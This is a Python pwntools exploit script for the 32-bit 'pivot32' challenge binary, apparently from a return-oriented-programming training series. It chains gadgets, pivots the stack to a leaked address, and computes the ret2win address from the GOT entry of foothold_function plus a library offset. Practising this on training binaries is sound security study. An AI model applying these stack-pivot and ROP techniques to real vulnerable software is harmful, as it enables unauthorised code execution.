#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pivot32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./pivot32_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ropper --arch x86 --file pivot32
# 0x080484a9: pop ebx; ret;
# 0x080485f0: call eax; add esp, 0x10; leave; ret;
# 0x0804882e: xchg esp, eax; ret;
# 0x0804882c: pop eax; ret;
# 0x08048830: mov eax, dword ptr [eax]; ret;
# 0x08048833: add eax, ebx; ret;
# 0x0804889b: pop ebp; ret;
POP_EBX = p32(0x80484a9)
CALL_EAX = p32(0x80485f0)
POP_EAX = p32(0x804882c)
XCHG_ESP_EAX = p32(0x804882e)
MOV_EAX_PTR = p32(0x8048830)
ADD_EAX_EBX = p32(0x8048833)
POP_EBP = p32(0x804889b)

# rabin2 -i pivot
# 0x08048520 GLOBAL FUNC       foothold_function
FOOTHOLD_PLT = p32(0x8048520)

# r2 pivot
# (r2) iS
# (r2) pd @ 0x080484b0
# ╎╎╎╎   ;-- foothold_function:
# ╎╎╎╎   0x08048520      ff2524a00408   jmp dword [reloc.foothold_function] ; 0x804a024
FOOTHOLD_GOT_PLT = p32(0x804a024)

# r2 libpivot.so
# (r2) aaa; afl
# 0x0000077d    1     43 sym.foothold_function
# 0x00000974    3    164 sym.ret2win
RET2WIN_OFFSET = 0x974 - 0x77d

# break after "call eax"
# (gdb) disassemble deregister_tm_clones
# break *0x80485f2

io = start()

io.recvuntil(b"libpivot\n")
NEW_ESP = int((io.recvline()[-9:-1]).decode(), 16)
io.recvuntil(b"> ")

# Payload
payload = POP_EAX + FOOTHOLD_PLT + CALL_EAX
payload += POP_EAX + FOOTHOLD_GOT_PLT + MOV_EAX_PTR
payload += POP_EBX + p32(RET2WIN_OFFSET) + ADD_EAX_EBX
payload += CALL_EAX

io.sendline(payload)

# Pivot

# EIP has 0x6161616c, but EBP will copied in ESP in the "leave" instruction
padding = b'A'  * cyclic_find(0x6161616b) + p32(NEW_ESP+0x8)

pivot = padding + POP_EAX + p32(NEW_ESP) + XCHG_ESP_EAX

io.recvuntil(b"> ")
io.sendline(pivot)

io.interactive()
